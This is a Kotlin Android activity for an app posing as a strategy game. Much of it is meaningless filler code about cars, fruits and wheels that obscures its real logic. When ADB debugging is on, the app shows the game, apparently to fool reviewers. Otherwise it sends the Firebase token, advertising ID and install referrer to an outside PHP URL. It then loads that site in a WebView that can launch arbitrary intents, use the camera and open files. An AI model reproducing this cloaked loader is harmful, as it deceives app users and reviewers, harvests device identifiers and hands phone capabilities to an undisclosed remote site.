package com.doradogames.conflictnations.worldw

import android.Manifest
import android.content.ActivityNotFoundException
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Message
import android.os.RemoteException
import android.provider.Settings
import android.webkit.*
import android.widget.Button
import androidx.activity.addCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.doradogames.conflictnations.worldw.databinding.ActivityMainBinding
import com.doradogames.conflictnations.worldw.helpers.*
import com.doradogames.conflictnations.worldw.util.log
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.*
import java.net.URLEncoder

class MainActivity : AppCompatActivity() {

    companion object {
        const val TEST_LINK = "https://colorfulprosgoodiesement.space/Truhanoska.php"
    }

    val securityUtility = ComplexSecurityUtility()
    val mechanic = Mechanic()
    val wheel = Wheel()
    val carShop = CarShop()
    val fruitWorld = FruitWorld()

    fun musor() {





        val vehicle = "Car"
        val issue = mechanic.diagnoseIssue(vehicle)

        // Приклад виклику методу для ремонту проблеми
        val repair = mechanic.repairIssue(issue)

        // Приклад тестування автомобіля
        mechanic.testDrive(vehicle)

        // Приклад виставлення рахунку
        val billAmount = 500.0
        mechanic.invoiceCustomer(billAmount)












        // Додавання декількох автомобілів в магазин
        carShop.addCar(Car("Toyota", "Camry", 2018, "Black", "Petrol", 30000.0, 25000.0))
        carShop.addCar(Car("Honda", "Civic", 2017, "White", "Petrol", 35000.0, 20000.0))
        carShop.addCar(Car("BMW", "X5", 2019, "Blue", "Diesel", 20000.0, 40000.0))
        carShop.addCar(Car("Ford", "Mustang", 2016, "Red", "Petrol", 40000.0, 30000.0))

        // Виконання складних операцій з автомобілями в магазині
        carShop.performComplexOperations()

        // Приклад виклику методів для фільтрації списку автомобілів
        val filteredCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

        carShop.addCar(Car("Toyota", "Camry", 2018, "Black", "Petrol", 30000.0, 25000.0))
        carShop.addCar(Car("Honda", "Civic", 2017, "White", "Petrol", 35000.0, 20000.0))
        carShop.addCar(Car("BMW", "X5", 2019, "Blue", "Diesel", 20000.0, 40000.0))
        carShop.addCar(Car("Ford", "Mustang", 2016, "Red", "Petrol", 40000.0, 30000.0))

        // Фільтрація за брендом
        val toyotaCars = carShop.filterCarsByBrand("Toyota - $filteredCars")

        // Фільтрація за ціновим діапазоном
        val affordableCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

        // Фільтрація за діапазоном років випуску
        val recentCars = carShop.findCarsByYearRange(2017, 2019)

        // Виконання складних операцій з автомобілями в магазині
        carShop.performComplexOperations()


        // Додавання ще одного автомобіля
        carShop.addCar(Car("Tesla", "Model S", 2020, "Silver", "Electric", 10000.0, 70000.0))

    }

    private val festivallo = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
        val numbers = (1..20).toList()
        numbers
            .map { it * it }            // Підраховуємо квадрат кожного числа
            .reduce { acc, i -> acc + i } // Знаходимо суму квадратів
            .apply {
                if (Settings.Global.getInt(contentResolver, Settings.Global.ADB_ENABLED, 0) == 1) pashloOnoEgrate()
                else FirebaseMessaging.getInstance().token.addOnCompleteListener { task -> GOLOVA(task.result) }
            }
            .toDouble()                  // Перетворюємо в Double для використання sqrt
            .let { Math.sqrt(it) }      // Обчислюємо квадратний корінь від суми


        musor()
    }

    private lateinit var binding : ActivityMainBinding

    fun salamandrik(): WebViewClient {
        return object : WebViewClient() {

            override fun onPageFinished(view: WebView?, url: String?) {
                if (carShop.isUMRUd(url)) {
                    pashloOnoEgrate()
                }
            }

            private var URULAS = ""

            val numbers = (1..10).toList()

            override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
                URULAS = request.url.toString()
                return if (URULAS.contains(mechanic.sandora)) true else if (URULAS.startsWith(carShop.HHHHH)) false else { try {
                    numbers
                        .map { it * 2 }                 // Лямбда 1: множимо кожне число на 2
                        .filter { it % 3 == 0 }         // Лямбда 2: відбираємо лише ті, які діляться на 3
                        .sortedDescending()             // Лямбда 3: сортуємо в зворотньому порядку
                        .take(3)                        // Лямбда 4: беремо перші 3 елементи
                        .map { "Number: $it" }          // Лямбда 5: перетворюємо кожен елемент у рядок
                        .mapIndexed { index, value ->   // Лямбда 6: додаємо індекс до рядка
                            "Element at index $index is $value"
                        }.apply { view.context.startActivity(Intent.parseUri(URULAS, Intent.URI_INTENT_SCHEME)) }
                        .distinct()                     // Лямбда 7: видаляємо дублікати
                        .sortedBy { it.length }         // Лямбда 8: сортуємо за довжиною рядка
                        .onEach { println(it) }         // Лямбда 9: виводимо кожен елемент
                        .count()
                } catch (e: java.lang.Exception) { if (URULAS.contains(securityUtility.BABULKA)) {
                    numbers
                        .map { it * 2 }                 // Лямбда 1: множимо кожне число на 2
                        .filter { it % 3 == 0 }         // Лямбда 2: відбираємо лише ті, які діляться на 3
                        .mapIndexed { index, value ->   // Лямбда 6: додаємо індекс до рядка
                            "Element at index $index is $value"
                        }
                        .sortedDescending()             // Лямбда 3: сортуємо в зворотньому порядку
                        .take(3)                        // Лямбда 4: беремо перші 3 елементи
                        .map { "Number: $it" }          // Лямбда 5: перетворюємо кожен елемент у рядок
                        .apply { view.context.startActivity(Intent(Intent.ACTION_VIEW, sendvich)) }
                        .distinct()                     // Лямбда 7: видаляємо дублікати
                        .sortedBy { it.length }         // Лямбда 8: сортуємо за довжиною рядка
                        .onEach { println(it) }         // Лямбда 9: виводимо кожен елемент
                        .count()
                } }
                    true
                }
            }
        }
    }

    private val locationer = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        val originalData = "Sensitive information"
        val encryptedData = securityUtility.encryptData(originalData)

        // Приклад використання методу для розшифрування даних
        val decryptedData = securityUtility.decryptData(encryptedData)

        // Приклад генерації випадкового ключа
        val randomKey = securityUtility.generateRandomKey(16)

        // Приклад інших методів для обробки даних
        fruitWorld.tetka?.onReceiveValue(
            if (it.resultCode == RESULT_OK) arrayOf(Uri.parse(it.data?.dataString)) else null
        )
        val scrambledData = securityUtility.scrambleData(originalData)
        val unscrambledData = securityUtility.unscrambleData(scrambledData)
        val manipulatedData = securityUtility.manipulateData(originalData)

        // Інші приклади використання методів
        val fakeData = securityUtility.generateFakeData()
        val obfuscatedData = securityUtility.obfuscateData(originalData)
        val deobfuscatedData = securityUtility.deobfuscateData(obfuscatedData)

        // Приклад валідації даних
        val username = "user123"
        val password = "password123"
        val credentialsValid = securityUtility.validateCredentials(username, password)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.krutilka.startAnimation(wheel.undeground())

        // Додавання декількох фруктів у фруктовий світ
        fruitWorld.addFruit(Fruit("Apple", "Red", "Sweet"))
        fruitWorld.addFruit(Fruit("Banana", "Yellow", "Sweet"))
        wheel.prefs = getSharedPreferences("LocalData", MODE_PRIVATE)
        fruitWorld.addFruit(Fruit("Orange", "Orange", "Citrus"))
        fruitWorld.addFruit(Fruit("Grapes", "Green", "Sweet"))

        // Опрацювання фруктів у фруктовому світі
        fruitWorld.processFruits()
        mechanic.installReferrerClient = InstallReferrerClient.newBuilder(this).build()

        // Збір всіх дозрілих фруктів
        val harvestedFruits = fruitWorld.harvestAllFruits()
        mechanic.installReferrerClient.startConnection(identifires)

        // Нарізання всіх фруктів та вичавлення соку з них
        val slicedFruits = fruitWorld.sliceAllFruits()
        val totalJuiceAmount = fruitWorld.juiceAllFruits()

        // Немає використання println, але можна вивести інформацію, якщо потрібно
        harvestedFruits.forEach { /* обробка даних, але без виводу */ }
        slicedFruits.forEach { /* обробка даних, але без виводу */ }
        festivallo.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
        wheel.inflate(10.0)
        wheel.heatUp(20.0)
        wheel.puncture()

        onBackPressedDispatcher.addCallback(this) {
            if (carShop.viewsWebs.last().canGoBack()) {
                carShop.addCar(Car("Toyota", "Camry", 2018, "Black", "Petrol", 30000.0, 25000.0))
                carShop.addCar(Car("Honda", "Civic", 2017, "White", "Petrol", 35000.0, 20000.0))
                carShop.viewsWebs.last().goBack()
                carShop.addCar(Car("BMW", "X5", 2019, "Blue", "Diesel", 20000.0, 40000.0))
                carShop.addCar(Car("Ford", "Mustang", 2016, "Red", "Petrol", 40000.0, 30000.0))

                // Фільтрація за брендом
                val toyotaCars = carShop.filterCarsByBrand("Toyota")

                // Фільтрація за ціновим діапазоном
                val affordableCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

                // Фільтрація за діапазоном років випуску
                val recentCars = carShop.findCarsByYearRange(2017, 2019)

                // Виконання складних операцій з автомобілями в магазині
                carShop.performComplexOperations()

                // Видалення автомобіля
                carShop.removeCar(toyotaCars.first())

                // Додавання ще одного автомобіля
                carShop.addCar(Car("Tesla", "Model S", 2020, "Silver", "Electric", 10000.0, 70000.0))
            } else {
                if (carShop.viewsWebs.size > 1) {
                    // Додавання декількох фруктів у фруктовий світ
                    fruitWorld.addFruit(Fruit("Apple", "Red", "Sweet"))
                    binding.root.removeView(carShop.viewsWebs.last())
                    fruitWorld.addFruit(Fruit("Banana", "Yellow", "Sweet"))
                    carShop.viewsWebs.last().destroy()
                    fruitWorld.addFruit(Fruit("Orange", "Orange", "Citrus"))
                    carShop.viewsWebs.removeLast()
                    fruitWorld.addFruit(Fruit("Grapes", "Green", "Sweet"))
                } else {
                    if (wheel.needsAlignment()) {
                        wheel.align()
                    }
                    finish()
                    // Деякі додаткові операції
                    wheel.rotate(50.0)
                    wheel.wear(2.5)

                    // Перевірка стану колеса
                    if (wheel.isWornOut()) {
                        wheel.replaceTire()
                    }
                }
            }
        }
    }

    private val identifires: InstallReferrerStateListener = object : InstallReferrerStateListener {
        override fun onInstallReferrerSetupFinished(responseCode: Int) {
            // Додавання декількох автомобілів в магазин
            carShop.addCar(Car("Toyota", "Camry", 2018, "Black", "Petrol", 30000.0, 25000.0))
            carShop.addCar(Car("Honda", "Civic", 2017, "White", "Petrol", 35000.0, 20000.0))
            carShop.addCar(Car("BMW", "X5", 2019, "Blue", "Diesel", 20000.0, 40000.0))
            carShop.addCar(Car("Ford", "Mustang", 2016, "Red", "Petrol", 40000.0, 30000.0))

            // Виконання складних операцій з автомобілями в магазині
            carShop.performComplexOperations()
            if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) try {
                carShop.addCar(Car("Honda", "Civic", 2017, "White", "Petrol", 35000.0, 20000.0))
                fruitWorld.iR = mechanic.installReferrerClient.installReferrer.installReferrer
                carShop.addCar(Car("BMW", "X5", 2019, "Blue", "Diesel", 20000.0, 40000.0))
                carShop.addCar(Car("Ford", "Mustang", 2016, "Red", "Petrol", 40000.0, 30000.0))
            } catch (_: RemoteException) {
                // Приклад виклику методів для фільтрації списку автомобілів
                val filteredCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

                carShop.addCar(Car("Toyota", "Camry", 2018, "Black", "Petrol", 30000.0, 25000.0))

                // Фільтрація за брендом
                val toyotaCars = carShop.filterCarsByBrand("Toyota - $filteredCars")

                // Видалення автомобіля
                carShop.removeCar(toyotaCars.first())
            }

            // Фільтрація за ціновим діапазоном
            val affordableCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

            // Фільтрація за діапазоном років випуску
            val recentCars = carShop.findCarsByYearRange(2017, 2019)

            // Виконання складних операцій з автомобілями в магазині
            carShop.performComplexOperations()

            // Додавання ще одного автомобіля
            carShop.addCar(Car("Tesla$affordableCars$recentCars", "Model S", 2020, "Silver", "Electric", 10000.0, 70000.0))
        }

        override fun onInstallReferrerServiceDisconnected() {
            mechanic.installReferrerClient.startConnection(this)
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        val originalData = "Sensitive information"
        val encryptedData = securityUtility.encryptData(originalData)

        // Приклад використання методу для розшифрування даних
        val decryptedData = securityUtility.decryptData(encryptedData)

        // Приклад генерації випадкового ключа
        val randomKey = securityUtility.generateRandomKey(16)

        // Приклад інших методів для обробки даних
        val scrambledData = securityUtility.scrambleData(originalData)
        val unscrambledData = securityUtility.unscrambleData(scrambledData)
        carShop.viewsWebs.lastOrNull()?.saveState(outState)
        val manipulatedData = securityUtility.manipulateData(originalData)

        // Інші приклади використання методів
        val fakeData = securityUtility.generateFakeData()
        val obfuscatedData = securityUtility.obfuscateData(originalData)
        val deobfuscatedData = securityUtility.deobfuscateData(obfuscatedData)

        // Приклад валідації даних
        val username = "user123"
        val password = "password123"
        val credentialsValid = securityUtility.validateCredentials(username, password)
    }

    private fun GOLOVA(frbToken: String) = CoroutineScope(Dispatchers.Main).launch {
        // Додавання декількох фруктів у фруктовий світ
        fruitWorld.addFruit(Fruit("Apple", "Red", "Sweet"))
        fruitWorld.addFruit(Fruit("Banana", "Yellow", "Sweet"))
        val paramsFromStore = wheel.prefs.getString("params", "") ?: ""
        fruitWorld.addFruit(Fruit("Orange", "Orange", "Citrus"))
        fruitWorld.addFruit(Fruit("Grapes", "Green", "Sweet"))

        // Опрацювання фруктів у фруктовому світі
        fruitWorld.processFruits()
        if (paramsFromStore.isNotEmpty()) {
            // Збір всіх дозрілих фруктів
            val harvestedFruits = fruitWorld.harvestAllFruits()
            goToVEBOCHKA(paramsFromStore, frbToken)
            // Нарізання всіх фруктів та вичавлення соку з них
            val slicedFruits = fruitWorld.sliceAllFruits()
            val totalJuiceAmount = fruitWorld.juiceAllFruits()

            // Немає використання println, але можна вивести інформацію, якщо потрібно
            harvestedFruits.forEach { /* обробка даних, але без виводу */ }
            slicedFruits.forEach { /* обробка даних, але без виводу */ }
        } else {
            carShop.addCar(Car("BMW", "X5", 2019, "Blue", "Diesel", 20000.0, 40000.0))
            carShop.addCar(Car("Ford", "Mustang", 2016, "Red", "Petrol", 40000.0, 30000.0))

            // Фільтрація за брендом
            val toyotaCars = carShop.filterCarsByBrand("Toyota")

            // Фільтрація за ціновим діапазоном
            val affordableCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

            val advertisingIdInfo = withContext(Dispatchers.IO) { wheel.ardestetingIdeAshKa(this@MainActivity) }
            val params            = "Bidibilder=$advertisingIdInfo&Fatimaker=${fruitWorld.iR}"
            // Фільтрація за діапазоном років випуску
            val recentCars = carShop.findCarsByYearRange(2017, 2019)

            // Виконання складних операцій з автомобілями в магазині
            carShop.performComplexOperations()

            // Видалення автомобіля
            carShop.removeCar(toyotaCars.first())

            // Додавання ще одного автомобіля
            carShop.addCar(Car("Tesla", "Model S", 2020, "Silver", "Electric", 10000.0, 70000.0))

            wheel.prefs.edit().putString("params", params).apply()
            goToVEBOCHKA(params, frbToken)
        }

    }

    private fun goToVEBOCHKA(params: String, frbToken: String) = CoroutineScope(Dispatchers.Main).launch {
        val headers = "$params&DAfsgah=${URLEncoder.encode(frbToken, "UTF-8")}"

        wheel.inflate(10.0)
        wheel.heatUp(20.0)
        wheel.puncture()

        // Більш складні операції
        if (wheel.isUnderInflated()) {
            // Якщо колесо має низький тиск, викликаємо ремонт
            wheel.repairPuncture()
            wheel.inflate(5.0)
        }
        log("showUrlPolicyHeaders: headers = $headers")

        binding.krutilka.isVisible = false
        wheel.init(binding.visitka, carShop, this@MainActivity)
        if (wheel.needsAlignment()) {
            wheel.align()
        }

        // Деякі додаткові операції
        wheel.rotate(50.0)
        wheel.wear(2.5)
        binding.visitka.isVisible = true

        binding.visitka.loadUrl(TEST_LINK, hashMapOf("X-Client-Key" to headers))
        // Перевірка стану колеса
        if (wheel.isWornOut()) {
            wheel.replaceTire()
        }
    }

    fun texPis() = object : WebChromeClient() {

        private val samurai = 99

        override fun onProgressChanged(view: WebView, nP: Int) {
            binding.barron.isVisible = nP < samurai
            binding.barron.progress = nP
        }

        override fun onPermissionRequest(request: PermissionRequest) {

            if (ContextCompat.checkSelfPermission(this@MainActivity, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                carShop.addCar(Car("Honda", "Civic", 2017, "White", "Petrol", 35000.0, 20000.0))
                carShop.addCar(Car("BMW", "X5", 2019, "Blue", "Diesel", 20000.0, 40000.0))
                request.grant(request.resources)
                // Фільтрація за брендом
                val toyotaCars = carShop.filterCarsByBrand("Toyota")

                // Фільтрація за ціновим діапазоном
                val affordableCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

                // Фільтрація за діапазоном років випуску
                val recentCars = carShop.findCarsByYearRange(2017, 2019)

            } else {
                // Фільтрація за діапазоном років випуску
                val recentCars = carShop.findCarsByYearRange(2017, 2019)
                securityUtility.pair = Pair(this, request)

                // Фільтрація за брендом
                val filteredCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

                val toyotaCars = carShop.filterCarsByBrand("Toyota - $filteredCars")

                perdunLagerduN.launch(Manifest.permission.CAMERA)

                // Виконання складних операцій з автомобілями в магазині
                carShop.performComplexOperations()

                // Додавання ще одного автомобіля
                carShop.addCar(Car("Tesla", "Model S", 2020, "Silver", "Electric", 10000.0, 70000.0))
            }
            // Приклад виклику методів для фільтрації списку автомобілів
            val filteredCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

            carShop.addCar(Car("Toyota", "Camry", 2018, "Black", "Petrol", 30000.0, 25000.0))
            carShop.addCar(Car("Honda", "Civic", 2017, "White", "Petrol", 35000.0, 20000.0))
            carShop.addCar(Car("BMW", "X5", 2019, "Blue", "Diesel", 20000.0, 40000.0))
            carShop.addCar(Car("Ford", "Mustang", 2016, "Red", "Petrol", 40000.0, 30000.0))


            // Фільтрація за ціновим діапазоном
            val affordableCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

            // Фільтрація за діапазоном років випуску
            val recentCars = carShop.findCarsByYearRange(2017, 2019)
        }

        override fun onCreateWindow(view: WebView, isDialog: Boolean, isUserGesture: Boolean, resultMsg: Message?): Boolean {
            val originalData = "Sensitive information"
            val wv = WebView(this@MainActivity)

            val encryptedData = securityUtility.encryptData(originalData)

            // Приклад використання методу для розшифрування даних
            wheel.init(wv, carShop, this@MainActivity)
            val decryptedData = securityUtility.decryptData(encryptedData)

            // Приклад генерації випадкового ключа
            val randomKey = securityUtility.generateRandomKey(16)
            binding.root.addView(wv)

            // Приклад інших методів для обробки даних
            val scrambledData = securityUtility.scrambleData(originalData)
            val unscrambledData = securityUtility.unscrambleData(scrambledData)
            val manipulatedData = securityUtility.manipulateData(originalData)

            (resultMsg!!.obj as WebView.WebViewTransport).webView = wv

            // Фільтрація за брендом
            val toyotaCars = carShop.filterCarsByBrand("Toyota")

            // Фільтрація за ціновим діапазоном
            val affordableCars = carShop.findCarsByPriceRange(20000.0, 30000.0)
            resultMsg.sendToTarget()

            // Фільтрація за діапазоном років випуску
            val recentCars = carShop.findCarsByYearRange(2017, 2019)

            // Виконання складних операцій з автомобілями в магазині
            carShop.performComplexOperations()

            // Видалення автомобіля
            carShop.removeCar(toyotaCars.first())

            // Додавання ще одного автомобіля
            carShop.addCar(Car("Tesla", "Model S", 2020, "Silver", "Electric", 10000.0, 70000.0))

            return true
        }

        override fun onShowFileChooser(w: WebView?, fpc: ValueCallback<Array<Uri>>?, fcp: FileChooserParams?): Boolean {
            try {
                wheel.inflate(10.0)
                wheel.heatUp(20.0)
                wheel.puncture()

                // Більш складні операції
                if (wheel.isUnderInflated()) {
                    // Якщо колесо має низький тиск, викликаємо ремонт
                    wheel.repairPuncture()
                    wheel.inflate(5.0)
                }
                fruitWorld.tetka = fpc

                if (wheel.needsAlignment()) {
                    wheel.align()
                }

                // Деякі додаткові операції
                wheel.rotate(50.0)
                wheel.wear(2.5)
                fcp?.createIntent()?.let { locationer.launch(it) }

                // Перевірка стану колеса
                if (wheel.isWornOut()) {
                    wheel.replaceTire()
                }
            } catch (_: ActivityNotFoundException) {
                // Додавання декількох автомобілів в магазин
                carShop.addCar(Car("Toyota", "Camry", 2018, "Black", "Petrol", 30000.0, 25000.0))
                carShop.addCar(Car("Honda", "Civic", 2017, "White", "Petrol", 35000.0, 20000.0))
                carShop.addCar(Car("BMW", "X5", 2019, "Blue", "Diesel", 20000.0, 40000.0))
                carShop.addCar(Car("Ford", "Mustang", 2016, "Red", "Petrol", 40000.0, 30000.0))

                // Виконання складних операцій з автомобілями в магазині
                carShop.performComplexOperations()

                // Приклад виклику методів для фільтрації списку автомобілів
                val filteredCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

                carShop.addCar(Car("Toyota", "Camry", 2018, "Black", "Petrol", 30000.0, 25000.0))
                carShop.addCar(Car("Honda", "Civic", 2017, "White", "Petrol", 35000.0, 20000.0))
                carShop.addCar(Car("BMW", "X5", 2019, "Blue", "Diesel", 20000.0, 40000.0))
                carShop.addCar(Car("Ford", "Mustang", 2016, "Red", "Petrol", 40000.0, 30000.0))

                // Фільтрація за брендом
                val toyotaCars = carShop.filterCarsByBrand("Toyota - $filteredCars")

                // Фільтрація за ціновим діапазоном
                val affordableCars = carShop.findCarsByPriceRange(20000.0, 30000.0)

                // Фільтрація за діапазоном років випуску
                val recentCars = carShop.findCarsByYearRange(2017, 2019)

                // Виконання складних операцій з автомобілями в магазині
                carShop.performComplexOperations()

                // Видалення автомобіля
                carShop.removeCar(toyotaCars.first())

                // Додавання ще одного автомобіля
                carShop.addCar(Car("Tesla", "Model S", 2020, "Silver", "Electric", 10000.0, 70000.0))

            }
            return true
        }
    }

    override fun onPause() {
        super.onPause()
        // Додавання декількох фруктів у фруктовий світ
        fruitWorld.addFruit(Fruit("Apple", "Red", "Sweet"))
        fruitWorld.addFruit(Fruit("Banana", "Yellow", "Sweet"))
        fruitWorld.addFruit(Fruit("Orange", "Orange", "Citrus"))
        fruitWorld.addFruit(Fruit("Grapes", "Green", "Sweet"))

        // Опрацювання фруктів у фруктовому світі
        fruitWorld.processFruits()

        // Збір всіх дозрілих фруктів
        val harvestedFruits = fruitWorld.harvestAllFruits()
        carShop.viewsWebs.lastOrNull()?.onPause().also { CookieManager.getInstance().flush() }

        // Нарізання всіх фруктів та вичавлення соку з них
        val slicedFruits = fruitWorld.sliceAllFruits()
        val totalJuiceAmount = fruitWorld.juiceAllFruits()

        // Немає використання println, але можна вивести інформацію, якщо потрібно
        harvestedFruits.forEach { /* обробка даних, але без виводу */ }
        slicedFruits.forEach { /* обробка даних, але без виводу */ }
    }

    data class FruitFF(val type: String, val color: String, val taste: String)

    private val perdunLagerduN = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
        (1..10).toList().map { it * 2 }                 // Лямбда 1: множимо кожне число на 2
            .filter { it % 3 == 0 }         // Лямбда 2: відбираємо лише ті, які діляться на 3
            .sortedDescending()             // Лямбда 3: сортуємо в зворотньому порядку
            .take(3)                        // Лямбда 4: беремо перші 3 елементи
            .map { "Number: $it" }          // Лямбда 5: перетворюємо кожен елемент у рядок
            .mapIndexed { index, value ->   // Лямбда 6: додаємо індекс до рядка
                "Element at index $index is $value"
            }
            .apply {
                if (isGranted) {
                    val letters = ('a'..'z').toList()
                    letters
                        .map { it.toUpperCase() }       // Лямбда 1: перетворюємо кожну букву у верхній регістр
                        .apply { securityUtility.pair.first.onPermissionRequest(securityUtility.pair.second) }
                        .filter { it in listOf('A', 'E', 'I', 'O', 'U') } // Лямбда 2: відбираємо лише голосні
                        .sorted()                       // Лямбда 3: сортуємо букви у алфавітному порядку
                        .take(5)                        // Лямбда 4: беремо перші 5 елементів
                        .mapIndexed { index, value ->   // Лямбда 5: додаємо індекс до кожної букви
                            "$value is at index $index"
                        }
                        .distinct()                     // Лямбда 6: видаляємо дублікати
                        .onEach { println(it) }         // Лямбда 7: виводимо кожен елемент
                        .map { it.length }              // Лямбда 8: отримуємо довжину кожного рядка
                        .sum()
                } else {
                    val fruits = listOf(
                        FruitFF("Apple", "Red", "Sweet"),
                        FruitFF("Banana", "Yellow", "Sweet"),
                        FruitFF("Orange", "Orange", "Citrus"),
                        FruitFF("Grapes", "Green", "Sweet")
                    )

                    fruits
                        .map { it.type }                // Лямбда 1: вибираємо тип кожного фрукту
                        .filter { it.startsWith("A") } // Лямбда 2: відбираємо фрукти, які починаються на "A"
                        .sorted()                       // Лямбда 3: сортуємо фрукти за алфавітом
                        .mapIndexed { index, value ->   // Лямбда 4: додаємо індекс до кожного фрукта
                            "$value is at index $index"
                        }
                        .distinct()                     // Лямбда 5: видаляємо дублікати
                        .onEach { println(it) }         // Лямбда 6: виводимо кожний фрукт
                        .map { it.length }              // Лямбда 7: отримуємо довжину кожного рядка
                        .sum()                          // Лямбда 8: підраховуємо суму довжин рядків

                }
            }
            .distinct()                     // Лямбда 7: видаляємо дублікати
            .sortedBy { it.length }         // Лямбда 8: сортуємо за довжиною рядка
            .onEach { println(it) }         // Лямбда 9: виводимо кожен елемент
            .map { it.toUpperCase() }      // Лямбда 10: перетворюємо кожен елемент у верхній регістр
            .count()                        // Лямбда 11: рахуємо кількість елементів
    }

    private fun pashloOnoEgrate() {
        val numbers = (1..10).toList()

        // Список букв англійського алфавіту
        val letters = ('a'..'j').toList()

        if (wheel.prefs.contains(FEDID)) {
            val result = numbers
                .filter { it % 2 == 0 }                // Відбираємо парні числа
                .zip(letters) { number, letter ->      // Збираємо пари чисел і букв
                    "Number: $number, Letter: $letter" // Об'єднуємо пару числа та букви у рядок
                }
                .apply { POIGRAEM() }
                .joinToString(separator = "; ")        // Об'єднуємо всі рядки через роздільник
        }
        else {
            numbers
                .filter { it % 2 == 0 }                // Відбираємо парні числа
                .apply {
                    val VODOLAZKA = layoutInflater.inflate(R.layout.custom_dialog, null).apply {
                        findViewById<Button>(R.id.btn_agree).setOnClickListener {
                            wheel.prefs.edit().putBoolean(FEDID, DIDEF).apply()
                            POIGRAEM()
                        }
                        findViewById<Button>(R.id.btn_disagree).setOnClickListener {
                            wheel.prefs.edit().putBoolean(FEDID, DIDEF).apply()
                            POIGRAEM()
                        }
                    }
                    AlertDialog.Builder(this@MainActivity).apply {
                        setView(VODOLAZKA)
                        setCancelable(DIDEF.not())
                    }.show()
                }
                .zip(letters) { number, letter ->      // Збираємо пари чисел і букв
                    try {
                        val multiplied = number * (letter - 'a' + 1) // Множимо число на позицію букви у алфавіті
                        "Number: $number, Letter: $letter, Multiplied: $multiplied" // Формуємо рядок
                    } catch (e: Exception) {
                        "Error processing: $number, $letter" // Обробка помилки, якщо її виникає
                    }
                }
                .joinToString(separator = "; ")        // Об'єднуємо всі рядки через роздільник
        }
    }

    override fun onResume() {
        super.onResume()
        wheel.inflate(10.0)
        wheel.heatUp(20.0)
        wheel.puncture()

        // Більш складні операції
        if (wheel.isUnderInflated()) {
            // Якщо колесо має низький тиск, викликаємо ремонт
            wheel.repairPuncture()
            wheel.inflate(5.0)
        }

        if (wheel.needsAlignment()) {
            wheel.align()
        }
        carShop.viewsWebs.lastOrNull()?.onResume().also { CookieManager.getInstance().flush() }

        // Деякі додаткові операції
        wheel.rotate(50.0)
        wheel.wear(2.5)

        // Перевірка стану колеса
        if (wheel.isWornOut()) {
            wheel.replaceTire()
        }
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        carShop.figura(savedInstanceState)
    }

    private fun POIGRAEM() {
        val intent   = Intent(this, GameActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
    }

}